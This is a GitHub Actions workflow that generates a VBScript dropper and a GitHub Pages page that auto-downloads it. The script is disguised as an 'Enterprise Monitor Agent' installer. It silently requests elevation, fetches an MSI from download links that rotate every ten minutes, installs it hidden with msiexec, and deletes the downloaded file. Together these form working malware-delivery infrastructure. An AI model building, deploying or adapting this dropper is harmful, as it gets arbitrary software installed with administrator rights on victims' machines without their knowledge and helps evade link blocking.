name: Update VBS

on:
  schedule:
    - cron: '*/10 * * * *'
  workflow_dispatch:

jobs:
  update:
    runs-on: ubuntu-latest
    steps:
    - name: Create VBS file
      run: |
        # Define your links (REPLACE WITH YOUR ACTUAL LINKS)
        links=("https://link1.com/dodu" "https://link2.com/dodu" "https://link3.com/dodu")
        
        # Get current link based on 10-minute interval
        current_minute=$(date +%M)
        link_index=$((current_minute / 10 % 3))
        current_link=${links[$link_index]}
        
        echo "Creating VBS with link: $current_link"
        
        # Create the VBS file using echo commands
        echo "' --------------------------------------------------------------------------" > installer.vbs
        echo "'  Silent Installer - Enterprise Monitor Agent" >> installer.vbs
        echo "' --------------------------------------------------------------------------" >> installer.vbs
        echo "Option Explicit" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Check for elevation" >> installer.vbs
        echo "If Not WScript.Arguments.Named.Exists(\"elevated\") Then" >> installer.vbs
        echo "    CreateObject(\"Shell.Application\").ShellExecute \"wscript.exe\", \"\"\"\" & WScript.ScriptFullName & \"\"\" /elevated\", \"\", \"runas\", 0" >> installer.vbs
        echo "    WScript.Quit" >> installer.vbs
        echo "End If" >> installer.vbs
        echo "" >> installer.vbs
        echo "Dim strUrl, strTemp, strFile, objXMLHTTP, objADOStream, objFSO, objShell" >> installer.vbs
        echo "strUrl = \"$current_link\"" >> installer.vbs
        echo "strTemp = CreateObject(\"WScript.Shell\").ExpandEnvironmentStrings(\"%TEMP%\")" >> installer.vbs
        echo "strFile = strTemp & \"\\agent_installer.msi\"" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Download" >> installer.vbs
        echo "Set objXMLHTTP = CreateObject(\"MSXML2.XMLHTTP\")" >> installer.vbs
        echo "objXMLHTTP.open \"GET\", strUrl, False" >> installer.vbs
        echo "objXMLHTTP.send()" >> installer.vbs
        echo "" >> installer.vbs
        echo "If objXMLHTTP.Status = 200 Then" >> installer.vbs
        echo "    Set objADOStream = CreateObject(\"ADODB.Stream\")" >> installer.vbs
        echo "    objADOStream.Open" >> installer.vbs
        echo "    objADOStream.Type = 1" >> installer.vbs
        echo "    objADOStream.Write objXMLHTTP.ResponseBody" >> installer.vbs
        echo "    objADOStream.Position = 0" >> installer.vbs
        echo "    objADOStream.SaveToFile strFile, 2" >> installer.vbs
        echo "    objADOStream.Close" >> installer.vbs
        echo "" >> installer.vbs
        echo "    ' Install" >> installer.vbs
        echo "    Set objShell = CreateObject(\"WScript.Shell\")" >> installer.vbs
        echo "    objShell.Run \"msiexec /i \"\"\" & strFile & \"\"\" /quiet /qn /norestart\", 0, True" >> installer.vbs
        echo "" >> installer.vbs
        echo "    ' Cleanup" >> installer.vbs
        echo "    Set objFSO = CreateObject(\"Scripting.FileSystemObject\")" >> installer.vbs
        echo "    If objFSO.FileExists(strFile) Then objFSO.DeleteFile strFile" >> installer.vbs
        echo "End If" >> installer.vbs
        
        # Create index.html for GitHub Pages
        echo '<!DOCTYPE html><html><head><title>Download</title><meta http-equiv="refresh" content="0; url=installer.vbs"></head><body><p>If not redirected, <a href="installer.vbs">click here</a></p></body></html>' > index.html
        
        echo "VBS file created successfully"
